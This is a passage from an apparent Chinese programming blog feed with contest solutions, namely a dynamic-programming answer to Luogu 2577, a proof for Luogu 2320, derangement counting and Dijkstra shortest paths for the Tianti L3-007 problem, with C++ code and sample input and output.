排在<code>j</code> 前面，并且两人各自的吃饭时间$b[j]&lt;b[i]$，现在交换过来</li><li>首先，交换前从队头到到<code>j</code> 总的打饭时间或者是交换后从队头到<code>i</code> 的总的打饭时间都是$T$</li><li>然后以前$T$时间后，<code>j</code> 开始吃饭，现在是$T$时间后，<code>i</code> 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是<code>j</code> 的吃饭时间），那么现在就是$T+b[i]&gt;T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ </li></ul><h4 id="如何记录状态以及状态转移方程"><a href="#如何记录状态以及状态转移方程" class="headerlink" title="如何记录状态以及状态转移方程"></a>如何记录状态以及状态转移方程</h4><ul><li><p>$dp[i][j][k]$ ：表示当排到第<code>i</code> 个人时，第一队的排队耗时是<code>j</code> ，第二队的排队耗时是<code>k</code> </p></li><li><p>先定义符号，$man[i].a$ 表示第<code>i</code> 人的打饭时间，$man[i].b$ 是第<code>i</code> 人的吃饭时间，$sum[x]=\Sigma_{i=0}^x man[i].a$</p></li><li><p>因为，对于确定的<code>i</code> ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ </p></li><li><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = MAX(dp[i<span class="number">-1</span>][j-man[i].a][k], j+man[i].b);</span><br><span class="line"><span class="keyword">int</span> y = MAX(dp[i<span class="number">-1</span>][j][k-man[i].a], k+man[i].b);</span><br><span class="line">dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y);</span><br></pre></td></tr></table></figure></li><li><p>之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX</p></li><li><p>因为无需枚举<code>k</code> ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组</p></li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FWD(x, b, e) for (int x = b; x &lt; e; x++)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BWD(x, b, e) for (int x = b; x &gt;= e; x--)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">MAX</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x &lt; y ? y : x; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">MIN</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x &lt; y ? x : y; &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a, b;<span class="comment">// a is pick time, b is eat time</span></span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> Node &amp;y) <span class="keyword">const</span> &#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;b &gt; y.b; &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Node man[<span class="number">300</span>];</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">80010</span>];</span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">300</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;man[i].a, &amp;man[i].b);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(man, man + n);</span><br><span class="line"></span><br><span class="line">    sum[<span class="number">0</span>] = man[<span class="number">0</span>].a;</span><br><span class="line">    FWD(i, <span class="number">1</span>, n) &#123; sum[i] = sum[i - <span class="number">1</span>] + man[i].a; &#125;</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">10</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>] = man[<span class="number">0</span>].b + man[<span class="number">0</span>].a;</span><br><span class="line">    dp[man[<span class="number">0</span>].a] = man[<span class="number">0</span>].b + man[<span class="number">0</span>].a;</span><br><span class="line">    FWD(i, <span class="number">1</span>, n) &#123;</span><br><span class="line">        BWD(j, sum[i], <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp1 = INF, tmp2 = INF;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= man[i].a) &#123;</span><br><span class="line">                tmp1 = MAX(dp[j - man[i].a], j + man[i].b);<span class="comment">// 第一个人放在1队</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum[i] - j &gt;= man[i].a) &#123;</span><br><span class="line">                tmp2 = MAX(dp[j], sum[i] - j + man[i].b);<span class="comment">// 第i个人放在二队</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果j只能允许man[i].a放在一队，则i就放一队</span></span><br><span class="line">            <span class="keyword">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &lt; man[i].a) &#123;</span><br><span class="line">                dp[j] = tmp1;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (j &lt; man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class="line">                dp[j] = tmp2;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class="line">                dp[j] = MIN(tmp2, tmp1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = INF;</span><br><span class="line">    FWD(i, <span class="number">0</span>, sum[n - <span class="number">1</span>] + <span class="number">1</span>) &#123; ans = ans &lt; dp[i] ? ans : dp[i]; &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>注意，在枚举$dp[i][j]$ 的<code>j</code> 时，要注意该<code>j</code> 是否允许<code>man[i].a</code> 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN</p></li><li><p>注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j&lt;man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j&lt;man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。</p></li><li><p>此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归</p><img src="/2018/05/20/洛谷2577-午餐/1.png"></li><li><p><a href="https://www.luogu.org/problemnew/solution/P2577" target="_blank" rel="noopener">截图来源 </a></p></li></ul>]]></content>
    
    <summary type="html">
    
      题解
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="ACM" scheme="https://h-zex.github.io/tags/ACM/"/>
    
      <category term="动态规划" scheme="https://h-zex.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>洛谷2320 鬼谷子的钱袋 形式化证明</title>
    <link href="https://h-zex.github.io/2018/05/17/%E6%B4%9B%E8%B0%B72320-%E9%AC%BC%E8%B0%B7%E5%AD%90%E7%9A%84%E9%92%B1%E8%A2%8B-%E5%BD%A2%E5%BC%8F%E5%8C%96%E8%AF%81%E6%98%8E/"/>
    <id>https://h-zex.github.io/2018/05/17/洛谷2320-鬼谷子的钱袋-形式化证明/</id>
    <published>2018-05-16T17:33:21.000Z</published>
    <updated>2018-08-04T04:48:35.607Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。</p><p>有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。</p><p>但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。</p><p>鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？</p><h4 id="输入输出格式"><a href="#输入输出格式" class="headerlink" title="输入输出格式"></a>输入输出格式</h4><ul><li><p>输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。</p></li><li><p>输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开</p></li></ul><h4 id="输入输出示例"><a href="#输入输出示例" class="headerlink" title="输入输出示例"></a>输入输出示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">输出</span><br><span class="line">2</span><br><span class="line">1 2</span><br></pre></td></tr></table></figure><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><ul><li>对于m个待装袋的金币，取$\lceil m/2\rceil$ 个金币装入第一个袋子，然后递归求解</li></ul><h2 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h2><ul><li>对于一个数m，采用每次分割一半的方法，共分割出$\lfloor lg_2m\rfloor+1$ 个袋子</li><li>按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\geq \lceil lg_2(m+1)\rceil$ </li><li>对于$m\geq1$，$\lceil lg_2(m+1)\rceil= \lfloor lg_2m\rfloor+1$</li><li>所以我们的解法已经达到了最优</li></ul>]]></content>
    
    <summary type="html">
    
      题解
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="ACM" scheme="https://h-zex.github.io/tags/ACM/"/>
    
      <category term="数学" scheme="https://h-zex.github.io/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="递归" scheme="https://h-zex.github.io/tags/%E9%80%92%E5%BD%92/"/>
    
  </entry>
  
  <entry>
    <title>组合数之错排数</title>
    <link href="https://h-zex.github.io/2018/05/14/%E7%BB%84%E5%90%88%E6%95%B0%E4%B9%8B%E9%94%99%E6%8E%92%E6%95%B0/"/>
    <id>https://h-zex.github.io/2018/05/14/组合数之错排数/</id>
    <published>2018-05-14T13:51:56.000Z</published>
    <updated>2018-08-04T04:48:35.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="错排数的定义"><a href="#错排数的定义" class="headerlink" title="错排数的定义"></a>错排数的定义</h2><ul><li>假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能</li></ul><h2 id="递推公式"><a href="#递推公式" class="headerlink" title="递推公式"></a>递推公式</h2><ul><li>设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ </li><li>解释如下<ul><li>假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能</li><li>假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能</li></ul></li><li>为什么没有其他可能？<ul><li>因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\neq i$ ，没有其他可能情况</li></ul></li></ul><h2 id="ACM题"><a href="#ACM题" class="headerlink" title="ACM题"></a>ACM题</h2><ul><li>hdu2049</li></ul>]]></content>
    
    <summary type="html">
    
      n个元素都不在自己的位置上，有多少种可能
    
    </summary>
    
      <category term="数学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    
      <category term="ACM" scheme="https://h-zex.github.io/tags/ACM/"/>
    
      <category term="组合数" scheme="https://h-zex.github.io/tags/%E7%BB%84%E5%90%88%E6%95%B0/"/>
    
      <category term="错排" scheme="https://h-zex.github.io/tags/%E9%94%99%E6%8E%92/"/>
    
  </entry>
  
  <entry>
    <title>天梯L3 007 天梯地图</title>
    <link href="https://h-zex.github.io/2018/05/13/%E5%A4%A9%E6%A2%AFL3-007-%E5%A4%A9%E6%A2%AF%E5%9C%B0%E5%9B%BE/"/>
    <id>https://h-zex.github.io/2018/05/13/天梯L3-007-天梯地图/</id>
    <published>2018-05-13T07:10:04.000Z</published>
    <updated>2018-08-04T04:48:35.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/2018/05/13/天梯L3-007-天梯地图/1.png"><h4 id="输入示例一"><a href="#输入示例一" class="headerlink" title="输入示例一"></a>输入示例一</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">10 15</span><br><span class="line">0 1 0 1 1</span><br><span class="line">8 0 0 1 1</span><br><span class="line">4 8 1 1 1</span><br><span class="line">5 4 0 2 3</span><br><span class="line">5 9 1 1 4</span><br><span class="line">0 6 0 1 1</span><br><span class="line">7 3 1 1 2</span><br><span class="line">8 3 1 1 2</span><br><span class="line">2 5 0 2 2</span><br><span class="line">2 1 1 1 1</span><br><span class="line">1 5 0 1 3</span><br><span class="line">1 4 0 1 1</span><br><span class="line">9 7 1 1 3</span><br><span class="line">3 1 0 2 5</span><br><span class="line">6 3 1 2 1</span><br><span class="line">5 3</span><br></pre></td></tr></table></figure><h4 id="输出示例一"><a href="#输出示例一" class="headerlink" title="输出示例一"></a>输出示例一</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Time = 6: 5 =&gt; 4 =&gt; 8 =&gt; 3</span><br><span class="line">Distance = 3: 5 =&gt; 1 =&gt; 3</span><br></pre></td></tr></table></figure><h4 id="输入示例二"><a href="#输入示例二" class="headerlink" title="输入示例二"></a>输入示例二</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">7 9</span><br><span class="line">0 4 1 1 1</span><br><span class="line">1 6 1 3 1</span><br><span class="line">2 6 1 1 1</span><br><span class="line">2 5 1 2 2</span><br><span class="line">3 0 0 1 1</span><br><span class="line">3 1 1 3 1</span><br><span class="line">3 2 1 2 1</span><br><span class="line">4 5 0 2 2</span><br><span class="line">6 5 1 2 1</span><br><span class="line">3 5</span><br></pre></td></tr></table></figure><h4 id="输出示例二"><a href="#输出示例二" class="headerlink" title="输出示例二"></a>输出示例二</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Time = 3; Distance = 4: 3 =&gt; 2 =&gt; 5</span><br></pre></td></tr></table></figure><h2 id="Dijstra算法"><a href="#Dijstra算法" class="headerlink" title="Dijstra算法"></a>Dijstra算法</h2><ul><li>bfs+优先队列其实就是dijstra算法</li><li>dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去</li><li>不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ </li></ul><h2 id="Dijstra找出所有最短路径"><a href="#Dijstra找出所有最短路径" class="headerlink" title="Dijstra找出所有最短路径"></a>Dijstra找出所有最短路径</h2><ul><li>从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。</li><li>具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如<code>vector&lt;int&gt; parent[600]</code> ，则<code>parent[n]</code> 代表的vector就是编号为n的节点的parent list</li><li>然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。</li></ul><h2 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h2><h4 id="不可以这样寻找同代价的不同parent-节点"><a href="#不可以这样寻找同代价的不同parent-节点" class="headerlink" title="不可以这样寻找同代价的不同parent 节点"></a>不可以这样寻找同代价的不同parent 节点</h4><ul><li><p>代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class="line"><span class="comment">// 其实edge t就代表了节点me</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> me;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    Edge_t(<span class="keyword">int</span> m, <span class="keyword">int</span> h, <span class="keyword">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> Edge_t &amp;x) <span class="keyword">const</span> &#123; <span class="keyword">return</span> x.t &lt; <span class="keyword">this</span>-&gt;t; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!que.empty()) &#123;</span><br><span class="line">    Edge_t t = que.top();</span><br><span class="line">    que.pop();</span><br><span class="line">    <span class="keyword">while</span> (!que.empty() &amp;&amp; que.top().t == t.t &amp;&amp; que.top().me == t.me)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可能某<code>Edge h</code> 确实跟pop出来的<code>Edge t</code>是代表的是同一个节点——也就是<code>h.me==t.me</code> ，并且代价相同。但是在堆中，还有同等代价的<code>Edge p</code>，其终点不是<code>t.me</code> ——也就是<code>p.me!=t.me</code> ，然后该<code>Edge p</code> 在堆中的位置处在<code>Edge h</code> 前面，所以上面那个while就没办法获得<code>Edge h</code> 从而无法获取完整的parent list。</p></li><li><p>另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出<code>Edge t</code> 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里</p></li></ul><h4 id="考虑自循环边"><a href="#考虑自循环边" class="headerlink" title="考虑自循环边"></a>考虑自循环边</h4><ul><li>直接判断要求某点A邻接的点不与A相同即可实现</li></ul><h4 id="因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意"><a href="#因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意" class="headerlink" title="因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意"></a>因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意</h4><ul><li>dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法</li></ul><h4 id="INF的取值要注意"><a href="#INF的取值要注意" class="headerlink" title="INF的取值要注意"></a>INF的取值要注意</h4><ul><li>dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得<code>INF+weight[i]</code>不再是INF</li></ul><h4 id="自己生成数据对拍时"><a href="#自己生成数据对拍时" class="headerlink" title="自己生成数据对拍时"></a>自己生成数据对拍时</h4><ul><li>要注意不要生成多重边，网上很多ac的代码都是不支持多重边的</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span 